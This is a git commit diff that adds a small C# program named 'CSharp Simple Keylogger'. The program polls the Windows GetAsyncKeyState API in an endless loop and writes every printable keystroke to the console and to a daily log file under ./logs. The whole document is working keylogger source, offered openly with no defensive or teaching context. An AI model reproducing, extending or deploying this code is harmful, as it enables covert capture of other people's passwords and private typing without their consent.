55e4a111224a5abc4ef8a4079e74548b02bef3a1
Charlzk <104715127+Charlzk05@users.noreply.github.com>
2022-10-02 14:01:41 +0800

    Add project files.

---
+++ CSharp Simple Keylogger/Program.cs
@@ -0,0 +1,44 @@
+﻿using System;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Threading;
+
+namespace CSharp_Simple_Keylogger
+{
+    internal class Program
+    {
+        [DllImport("User32.dll")]
+        public static extern int GetAsyncKeyState(Int32 i);
+
+        static void Main(string[] args)
+        {
+            if (Directory.Exists("./logs"))
+            {
+
+            }
+            else
+            {
+                Directory.CreateDirectory("./logs");
+            }
+
+            while (true)
+            {
+                Thread.Sleep(20);
+
+                for (int i = 32; i < 127; i++)
+                {
+                    int keyState = GetAsyncKeyState(i);
+                    if (keyState == 32769)
+                    {
+                        Console.Write((char)i);
+
+                        using (StreamWriter writer = File.AppendText($"./logs/{DateTime.UtcNow.ToString("MM-dd-yyyy")}.txt"))
+                        {
+                            writer.Write((char)i);
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
